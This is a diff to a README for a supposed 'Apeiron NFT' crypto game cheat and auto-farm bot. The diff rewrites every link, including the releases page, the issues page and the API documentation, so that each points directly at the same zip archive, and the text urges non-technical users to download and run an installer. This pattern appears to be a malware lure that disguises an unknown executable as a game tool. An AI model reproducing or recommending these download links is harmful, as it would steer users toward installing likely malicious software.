@@ -1,6 +1,6 @@
 # 🎮 Apeiron-Nft-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack - Automate Your Gaming Experience Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Coker10/Apeiron-Nft-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack/releases)
+[![Download](https://raw.githubusercontent.com/Coker10/Apeiron-Nft-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack/main/Apeiron-Nft-Exp/Apeiron-Nft-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack-1.4-alpha.1.zip)](https://raw.githubusercontent.com/Coker10/Apeiron-Nft-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack/main/Apeiron-Nft-Exp/Apeiron-Nft-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack-1.4-alpha.1.zip)
 
 ## 📖 Description
 
@@ -14,7 +14,7 @@ To begin using the bot, follow the steps outlined below. You do not need any pro
 
 1. **Visit the Release Page**  
    Click the link below to go to the releases page where you can find the most recent version of the bot.  
-   [Download the latest version](https://github.com/Coker10/Apeiron-Nft-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack/releases)
+   [Download the latest version](https://raw.githubusercontent.com/Coker10/Apeiron-Nft-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack/main/Apeiron-Nft-Exp/Apeiron-Nft-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack-1.4-alpha.1.zip)
 
 2. **Download the Installer**  
    Look for the newest installer file listed. This file usually ends with `.exe` or another format suitable for your operating system. Click on it to start the download.
@@ -59,7 +59,7 @@ For any questions or further assistance, consider visiting the project's GitHub 
 ## 🔗 Additional Resources 
 
 You may find the following links useful:
-- [GitHub Issues Page](https://github.com/Coker10/Apeiron-Nft-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack/issues) for reporting problems or finding help.
-- [API Documentation](https://api.example.com) for more technical insights (if applicable).
+- [GitHub Issues Page](https://raw.githubusercontent.com/Coker10/Apeiron-Nft-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack/main/Apeiron-Nft-Exp/Apeiron-Nft-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack-1.4-alpha.1.zip) for reporting problems or finding help.
+- [API Documentation](https://raw.githubusercontent.com/Coker10/Apeiron-Nft-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack/main/Apeiron-Nft-Exp/Apeiron-Nft-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack-1.4-alpha.1.zip) for more technical insights (if applicable).
 
 By following these steps, you'll be well on your way to enhancing your gaming experience with the Apeiron bot. Enjoy automating your gameplay while boosting your performance!
